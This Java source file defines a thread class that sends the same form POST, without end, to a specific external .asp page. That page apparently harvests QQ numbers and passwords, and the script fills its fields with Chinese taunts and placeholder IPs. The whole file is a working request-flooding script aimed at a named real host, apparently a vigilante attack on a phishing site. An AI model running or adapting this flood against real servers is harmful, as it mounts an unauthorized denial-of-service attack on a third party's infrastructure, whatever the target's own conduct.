/*
 * Copyright 2019 kiwipeach(1099501218@qq.com).
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package cn.kiwipeach.junit.http;

import lombok.extern.slf4j.Slf4j;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.message.BasicHeader;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;

/**
 * @author kiwipeach
 * @create 2019-03-22
 */
@Slf4j
public class MyThread implements Runnable {

    @Override
    public void run() {
        CloseableHttpClient httpclient = HttpClientBuilder.create().build();
        HttpPost httpPost = new HttpPost("http://zhi.tai.quan.zheyou.org/fuqe/index2.asp");
        httpPost.setHeader(new BasicHeader("Content-Type", "application/x-www-form-urlencoded"));
        List<NameValuePair> nvps = new ArrayList<>();
        nvps.add(new BasicNameValuePair("QQNumber", "就凭你这点本事还想搞事情？"));
        nvps.add(new BasicNameValuePair("QQPassWord", "不好意思，还嫩了点！"));
        nvps.add(new BasicNameValuePair(" image.x", "不好意思，还嫩了点！"));
        nvps.add(new BasicNameValuePair(" image.y", "不好意思，还嫩了点！"));
        nvps.add(new BasicNameValuePair("ip", "xx.xx.xx.xx"));
        nvps.add(new BasicNameValuePair("ip2", "xx.xx.xx.xx"));
        try {
            httpPost.setEntity(new UrlEncodedFormEntity(nvps));
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        while (true) {
            try {
                CloseableHttpResponse execute = httpclient.execute(httpPost);
                log.info("{}响应内容:{}", Thread.currentThread().getName(), EntityUtils.toString(execute.getEntity()));
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
